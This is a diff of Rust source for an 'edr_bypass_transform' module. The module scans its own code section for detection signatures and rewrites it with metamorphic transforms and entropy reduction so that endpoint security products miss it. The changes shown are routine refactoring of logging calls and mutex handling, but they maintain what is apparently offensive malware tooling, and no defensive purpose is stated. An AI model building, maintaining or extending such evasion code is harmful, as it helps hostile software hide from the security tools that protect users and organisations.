@@ -67,6 +67,7 @@ const _: () = assert!(
     "PAGE_READWRITE must differ from PAGE_EXECUTE_READWRITE"
 );
 
+use common::lock::MutexExt;
 use anyhow::{bail, Context, Result};
 use once_cell::sync::Lazy;
 use rand::Rng;
@@ -333,7 +334,7 @@ pub fn scan_for_signatures() -> Result<Vec<SignatureHit>> {
     hits.dedup_by(|a, b| a.offset == b.offset && a.name == b.name);
 
     LAST_SCAN_COUNT.store(hits.len() as u32, Ordering::Relaxed);
-    log::info!(
+    tracing::info!(
         "edr_bypass_transform: scan found {} signature hits",
         hits.len()
     );
@@ -912,7 +913,7 @@ fn deentropize_pass(
 
     // Only run if entropy exceeds the configured threshold.
     if current_entropy <= entropy_threshold {
-        log::debug!(
+        tracing::debug!(
             "edr_bypass_transform: entropy {:.3} within threshold {:.3}, de-entropization skipped",
             current_entropy,
             entropy_threshold,
@@ -920,7 +921,7 @@ fn deentropize_pass(
         return Vec::new();
     }
 
-    log::info!(
+    tracing::info!(
         "edr_bypass_transform: entropy {:.3} exceeds threshold {:.3}, running de-entropization pass",
         current_entropy,
         entropy_threshold,
@@ -935,7 +936,7 @@ fn deentropize_pass(
         .collect();
 
     if nop_sites.is_empty() {
-        log::debug!("edr_bypass_transform: no semantic NOP sites to de-entropize");
+        tracing::debug!("edr_bypass_transform: no semantic NOP sites to de-entropize");
         return Vec::new();
     }
 
@@ -979,7 +980,7 @@ fn deentropize_pass(
         // Check entropy after each replacement — stop early if we're under.
         let new_entropy = shannon_entropy(text);
         if new_entropy <= entropy_threshold {
-            log::info!(
+            tracing::info!(
                 "edr_bypass_transform: de-entropization reduced entropy to {:.3} after {} replacements",
                 new_entropy,
                 replacements,
@@ -988,7 +989,7 @@ fn deentropize_pass(
         }
     }
 
-    log::info!(
+    tracing::info!(
         "edr_bypass_transform: de-entropization applied {} low-entropy replacements",
         replacements,
     );
@@ -1194,7 +1195,7 @@ pub fn run_edr_bypass_transform(
 
     // Step 2b: Compute entropy before transforms.
     let entropy_before = shannon_entropy(text_before);
-    log::info!(
+    tracing::info!(
         "edr_bypass_transform: .text entropy before transforms: {:.3}",
         entropy_before,
     );
@@ -1225,7 +1226,7 @@ pub fn run_edr_bypass_transform(
         .map(|h| h.offset)
         .collect();
 
-    log::info!(
+    tracing::info!(
         "edr_bypass_transform: {} actionable hits out of {} total (entropy threshold: {:.1})",
         actionable_offsets.len(),
         hits.len(),
@@ -1237,7 +1238,7 @@ pub fn run_edr_bypass_transform(
     if applied < max_transforms {
         let recs = transform_xor_to_sub(text_mut, &excluded, &actionable_offsets);
         for r in &recs {
-            log::debug!(
+            tracing::debug!(
                 "edr_bypass_transform: applied {} at offset {}",
                 r.transform_type,
                 r.offset
@@ -1251,7 +1252,7 @@ pub fn run_edr_bypass_transform(
     if applied < max_transforms {
         let recs = transform_register_reassignment(text_mut, &excluded, &actionable_offsets);
         for r in &recs {
-            log::debug!(
+            tracing::debug!(
                 "edr_bypass_transform: applied {} at offset {}",
                 r.transform_type,
                 r.offset
@@ -1265,7 +1266,7 @@ pub fn run_edr_bypass_transform(
     if applied < max_transforms {
         let recs = transform_nop_insertion(text_mut, &excluded, &actionable_offsets);
         for r in &recs {
-            log::debug!(
+            tracing::debug!(
                 "edr_bypass_transform: applied {} at offset {}",
                 r.transform_type,
                 r.offset
@@ -1280,7 +1281,7 @@ pub fn run_edr_bypass_transform(
     if applied < max_transforms {
         let recs = transform_constant_splitting(text_mut, &excluded, &actionable_offsets);
         for r in &recs {
-            log::debug!(
+            tracing::debug!(
                 "edr_bypass_transform: applied {} at offset {}",
                 r.transform_type,
                 r.offset
@@ -1295,7 +1296,7 @@ pub fn run_edr_bypass_transform(
     if applied < max_transforms {
         let recs = transform_register_swap_rax_r11(text_mut, &excluded, &actionable_offsets);
         for r in &recs {
-            log::debug!(
+            tracing::debug!(
                 "edr_bypass_transform: applied {} at offset {}",
                 r.transform_type,
                 r.offset
@@ -1309,7 +1310,7 @@ pub fn run_edr_bypass_transform(
     if applied < max_transforms {
         let recs = transform_jump_obfuscation(text_mut, &excluded, &actionable_offsets);
         for r in &recs {
-            log::debug!(
+            tracing::debug!(
                 "edr_bypass_transform: applied {} at offset {}",
                 r.transform_type,
                 r.offset
@@ -1323,7 +1324,7 @@ pub fn run_edr_bypass_transform(
     if applied < max_transforms {
         let recs = transform_indirect_call(text_mut, &excluded, &actionable_offsets);
         for r in &recs {
-            log::debug!(
+            tracing::debug!(
                 "edr_bypass_transform: applied {} at offset {}",
                 r.transform_type,
                 r.offset
@@ -1346,7 +1347,7 @@ pub fn run_edr_bypass_transform(
     if applied > 0 {
         let deent_recs = deentropize_pass(text_mut, &all_transforms, &excluded, entropy_threshold);
         if !deent_recs.is_empty() {
-            log::debug!(
+            tracing::debug!(
                 "edr_bypass_transform: de-entropization replaced {} NOP sites with low-entropy padding",
                 deent_recs.len(),
             );
@@ -1375,7 +1376,7 @@ pub fn run_edr_bypass_transform(
         }
         let region_entropy = shannon_entropy(&text_after[rec.offset..rec_end]);
         if region_entropy < ENTROPY_FLOOR {
-            log::warn!(
+            tracing::warn!(
                 "edr_bypass_transform: transformed region at offset {} has low entropy {:.3} (floor: {:.3}) — possible failed transform",
                 rec.offset,
                 region_entropy,
@@ -1384,7 +1385,7 @@ pub fn run_edr_bypass_transform(
         }
     }
 
-    log::info!(
+    tracing::info!(
         "edr_bypass_transform: .text entropy after transforms: {:.3} (delta: {:+.3})",
         entropy_after,
         entropy_after - entropy_before,
@@ -1406,12 +1407,12 @@ pub fn run_edr_bypass_transform(
         ) {
             Ok(status) => status,
             Err(e) => {
-                log::warn!("edr_bypass_transform: NtFlushInstructionCache resolution failed: {e}");
+                tracing::warn!("edr_bypass_transform: NtFlushInstructionCache resolution failed: {e}");
                 0
             }
         };
         if status != 0 {
-            log::warn!("edr_bypass_transform: NtFlushInstructionCache returned 0x{status:08X}");
+            tracing::warn!("edr_bypass_transform: NtFlushInstructionCache returned 0x{status:08X}");
         }
     }
 
@@ -1444,7 +1445,7 @@ pub fn run_edr_bypass_transform(
         entropy_after,
     };
 
-    log::info!(
+    tracing::info!(
         "edr_bypass_transform: cycle complete — {} transforms applied, {} skipped, {} ms, entropy {:.3}→{:.3}",
         applied,
         skipped,
@@ -1455,7 +1456,7 @@ pub fn run_edr_bypass_transform(
 
     // Store last result for status queries.
     {
-        let mut guard = LAST_RESULT.lock().unwrap();
+        let mut guard = LAST_RESULT.lock_recover();
         *guard = Some(result.clone());
     }
 
@@ -1474,7 +1475,7 @@ pub fn status() -> String {
     let last_timestamp = LAST_SCAN_TIMESTAMP.load(Ordering::Relaxed);
 
     let last_cycle_info = {
-        let guard = LAST_RESULT.lock().unwrap();
+        let guard = LAST_RESULT.lock_recover();
         guard.as_ref().map(|r| {
             serde_json::json!({
                 "hash_before": r.hash_before,
